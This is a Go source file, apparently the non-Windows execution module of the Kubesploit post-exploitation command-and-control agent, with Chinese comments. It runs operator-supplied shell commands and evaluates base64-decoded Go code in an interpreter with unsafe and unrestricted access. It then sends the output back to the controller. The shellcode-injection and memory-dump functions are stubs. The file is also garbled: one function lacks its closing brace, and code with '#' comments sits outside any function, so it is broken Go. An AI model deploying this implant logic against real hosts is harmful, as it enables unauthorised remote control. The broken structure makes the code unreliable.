# `kubesploit\pkg\agent\exec.go`

```
// +build !windows
// 如果不是在 Windows 系统下编译，则包含该文件

// Kubesploit 是一个基于 Russel Van Tuyl 的 Merlin 构建的后渗透命令和控制框架。
// 本文件是 Kubesploit 的一部分。
// 版权所有 2021 CyberArk Software Ltd。

// Kubesploit 是自由软件：您可以根据 GNU 通用公共许可证的条款重新分发和/或修改它，
// 无论是许可证的第 3 版还是任何以后的版本。

// Kubesploit 是希望能够有助于增强组织安全的软件。
// Kubesploit 不得以任何恶意方式使用。
// Kubesploit 按原样分发，没有任何担保；包括适销性或特定用途的隐含担保。请参阅
// GNU 通用公共许可证以获取更多详细信息。

// 您应该已经收到 GNU 通用公共许可证的副本。
// 如果没有，请参阅 <http://www.gnu.org/licenses/>。

package agent

import (
    "bufio"
    b64 "encoding/base64"
    "github.com/mattn/go-shellwords"
    "github.com/traefik/yaegi/stdlib/unrestricted"
    "kubesploit/pkg/messages"
    "runtime"
    "time"

    // 标准库
    "errors"
    "fmt"
    "github.com/traefik/yaegi/interp"
    "github.com/traefik/yaegi/stdlib"
    "github.com/traefik/yaegi/stdlib/unsafe"
    "io/ioutil"
    "os"
    "os/exec"
)

// https://github.com/containous/yaegi/blob/f19b7563ea92b5c467c9e5e325a0a5b559712473/interp/interp_file_test.go
// ExecuteCommandGoInterpreter 是一个函数，用于指示代理通过主机操作系统上的 Go 解释器（"yeagi"）执行 Go 代码
func ExecuteCommandGoInterpreter(name string, args []string) (stdout string, stderr string) {
    /*
        argS, errS := shellwords.Parse(arg)
        if errS != nil {
            return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
        }*/

    backupStdout := os.Stdout
    // 将标准输出重定向到备份的标准输出
    defer func() { os.Stdout = backupStdout }()
    // 创建一个管道，返回读取端和写入端
    r, w, _ := os.Pipe()
    // 将标准输出重定向到写入端
    os.Stdout = w
    // 创建一个新的解释器实例
    i := interp.New(interp.Options{})
    // 使用标准库的符号
    i.Use(interp.Symbols)
    // 使用标准库的符号
    i.Use(stdlib.Symbols)
    // 使用不安全的符号
    i.Use(unsafe.Symbols)
    // 使用不受限制的符号
    i.Use(unrestricted.Symbols)

    // 对名称进行 base64 解码
    uDec, err := b64.StdEncoding.DecodeString(name)
    if err == nil {
        name = string(uDec)
    }

    // 在解释器中执行名称
    _, err = i.Eval(name)
    // 如果出现错误，将错误信息存储到 stderr 中
    if err != nil {
        stderr = err.Error()
    }

    // 对参数进行 base64 解码并在解释器中执行
    for _, arg := range(args) {
        uDec, err := b64.StdEncoding.DecodeString(arg)
        if err == nil {
            arg = string(uDec)
        }
        _, err = i.Eval(arg)
        if err != nil {
            stderr = err.Error()
        }
    }

    // 关闭写入端的管道
    if err = w.Close(); err != nil {
        stderr += "; Failed to close the pipe: " + err.Error()
    }
    // 读取从解释器中输出的内容
    outInterp, err := ioutil.ReadAll(r)

    // 如果读取出现错误，将错误信息存储到 stderr 中
    if err != nil {
        stderr += "; Failed to read ioutil: " + err.Error()
    }

    // 将读取到的内容存储到 stdout 中
    stdout = string(outInterp)
    // 返回 stdout 和 stderr
    return stdout, stderr
func ExecuteCommandGoInterpreterProgress(name string, args []string, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
    // 定义一个函数，接收命令名称、参数、结果、返回消息和代理对象作为参数，并返回标准输出和标准错误输出

    var ttyName string
    if runtime.GOOS == "windows" {
        fmt.Println("*** Using `con`")
        ttyName = "con"
    } else {
        fmt.Println("*** Using `/dev/tty`")
        ttyName = "/dev/tty"
    }

    f, err := os.OpenFile(ttyName, os.O_WRONLY, 0644)
    if err != nil {
        panic(err)
    }

    defer f.Close()

    r, w, _ := os.Pipe()
    oldStdout := os.Stdout
    os.Stdout = w
    defer func() {
        os.Stdout = oldStdout
        //fmt.Println("*** DONE")
        result.Stdout = "*** DONE ***"
        returnMessage.Payload = result
        agent.sendMessage("post", returnMessage)
    }()

    fmt.Fprintln(f, "*** Stdout redirected")

    // 创建一个管道，将标准输出重定向到管道中
    // 创建一个新的解释器实例
    i := interp.New(interp.Options{})
    i.Use(interp.Symbols)
    i.Use(stdlib.Symbols)
    i.Use(unsafe.Symbols)
    i.Use(unrestricted.Symbols)

    // 对命令名称进行 base64 解码
    uDec, err := b64.StdEncoding.DecodeString(name)
    if err == nil {
        name = string(uDec)
    }

    // 检查标准错误输出前
    // 启动一个 goroutine，执行命令并处理标准错误输出
    go func(){
        i.Eval(name)
        //i.Eval(args[0])

        for _, arg := range(args) {
            uDec, err := b64.StdEncoding.DecodeString(arg)
            if err == nil {
                arg = string(uDec)
            }

            _, err = i.Eval(arg)
            if err != nil {
                stderr = err.Error()
            }
        }
        // 为扫描器扫描提供时间
        time.Sleep(4000 * time.Millisecond)
        w.Close()
        r.Close()
    }()
}
    # 创建一个无缓冲的通道
    c := make(chan struct{})
    # 启动一个匿名的 goroutine，向通道 c 发送一个空结构体
    go func(){c <- struct{}{}}()
    # 在函数返回时关闭通道 c
    defer close(c)

    # 从通道 c 中接收数据，阻塞直到接收到数据
    <-c
    # 创建一个新的 Scanner 对象，用于从 r 中读取数据
    scanner := bufio.NewScanner(r)
    # 设置返回消息的类型为 "CmdResults"
    returnMessage.Type = "CmdResults"
    # 逐行扫描输入，将每行数据写入到文件 f 中
    for scanner.Scan() {
        m := scanner.Text()
        fmt.Fprintln(f, "output: " + m)

        # 将扫描到的数据作为标准输出
        result.Stdout = string(m)
        # 设置返回消息的载荷为 result
        returnMessage.Payload = result
        # 发送消息给 agent
        agent.sendMessage("post", returnMessage)
    }

    /*
        # 启动一个 goroutine，执行 i.Eval(name) 函数
        go i.Eval(name)
        # 如果发生错误，将错误信息写入 stderr
        if err != nil {
            stderr = err.Error()
        }*/
    /*
        # 遍历参数列表 args
        for _, arg := range(args) {
            # 对每个参数进行 base64 解码
            uDec, err := b64.StdEncoding.DecodeString(arg)
            # 如果解码成功，将解码后的字符串赋值给 arg
            if err == nil {
                arg = string(uDec)
            }

            # 执行 i.Eval(arg) 函数
            _, err = i.Eval(arg)
            # 如果发生错误，将错误信息写入 stderr
            if err != nil {
                stderr = err.Error()
            }
        }*/


    /*
        # 循环读取 r 中的数据
        for {
            # 创建一个无缓冲的字符串通道 outC
            outC := make(chan string)
            # 启动一个 goroutine，将 r 中的数据拷贝到 buf 中，然后将 buf 转换为字符串发送到 outC
            go func() {
                var buf bytes.Buffer
                io.Copy(&buf, r)
                outC <- buf.String()
            }()

            # 恢复正常状态
            w.Close()
            os.Stdout = backupStdout
            # 从 outC 中接收数据
            out := <-outC

            # 设置返回消息的类型为 "CmdResults"
            returnMessage.Type = "CmdResults"
            # 将 out 作为标准输出
            result.Stdout = string(out)
            # 设置返回消息的载荷为 result
            returnMessage.Payload = result
            # 发送消息给 agent
            agent.sendMessage("post", returnMessage)
        }

        # 恢复真实的标准输出
        os.Stdout = backupStdout
        # 关闭管道 w，并将错误信息写入 stderr
        if err = w.Close(); err != nil {
            stderr += "; Failed to close the pipe: " + err.Error()
        }
        # 读取 r 中的数据到 outInterp
        outInterp, err := ioutil.ReadAll(r)

        # 如果发生错误，将错误信息写入 stderr
        if err != nil {
            stderr += "; Failed to read ioutil: " + err.Error()
        }

    */
    # 返回标准输出和错误信息
    return stdout, stderr
// ExecuteCommand 是一个函数，用于指示代理在主机操作系统上执行命令
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
    var cmd *exec.Cmd

    // 解析命令行参数
    argS, errS := shellwords.Parse(arg)
    if errS != nil {
        return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
    }

    // 创建执行命令对象
    cmd = exec.Command(name, argS...) // #nosec G204

    // 执行命令并获取输出
    out, err := cmd.CombinedOutput()
    stdout = string(out)
    stderr = ""

    // 检查是否有错误发生
    if err != nil {
        stderr = err.Error()
    }

    return stdout, stderr
}

// ExecuteCommandScriptInCommands 是一个函数，用于指示代理在主机操作系统上执行命令脚本
func ExecuteCommandScriptInCommands(name string, arg string) (stdout string, stderr string) {
    var cmd *exec.Cmd

    // 解析命令行参数
    argS, errS := shellwords.Parse(arg)
    if errS != nil {
        return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
    }

    // 根据参数长度执行不同的命令
    switch argSLen := len(argS);{
    case argSLen > 2:
        argS = append(argS,[]string{"",""}...)
        copy(argS[4:],argS[2:])
        argS[2]=name
        argS[3]="_"
        cmd = exec.Command(argS[0],argS[1:]...)
    case argSLen == 2:
        cmd = exec.Command(argS[0],argS[1],name) // #nosec G204
    case argSLen < 2:
        return "","Modules with source code must run with at lease 2 commands: sh -c"
    }

    // 执行命令并获取输出
    out, err := cmd.CombinedOutput()
    stdout = string(out)
    stderr = ""

    // 检查是否有错误发生
    if err != nil {
        stderr = err.Error()
    }

    return stdout, stderr
}

// ExecuteShellcodeSelf 在当前进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要与 exec_windows.go 相匹配，并且必须使用输入
func ExecuteShellcodeSelf(shellcode []byte) error {
    shellcode = nil
    return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRemote 在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要与 exec_windows.go 相匹配，并且必须使用输入
// 在给定的操作系统中，未实现执行 shellcode 的功能，返回错误信息
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
    shellcode = nil
    pid = 0
    return errors.New("shellcode execution is not implemented for this operating system")
}

// 使用 Windows 的 RtlCreateUserThread 调用，在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
    shellcode = nil
    pid = 0
    return errors.New("shellcode execution is not implemented for this operating system")
}

// 使用 Windows 的 QueueUserAPC API 调用，在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
    shellcode = nil
    pid = 0
    return errors.New("shellcode execution is not implemented for this operating system")
}

// miniDump 是一个仅在 Windows 系统下可用的模块函数，用于转储提供进程的内存
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
    var mini map[string]interface{}
    tempDir = ""
    process = ""
    inPid = 0
    return mini, errors.New("minidump doesn't work on non-windows hosts")
}
```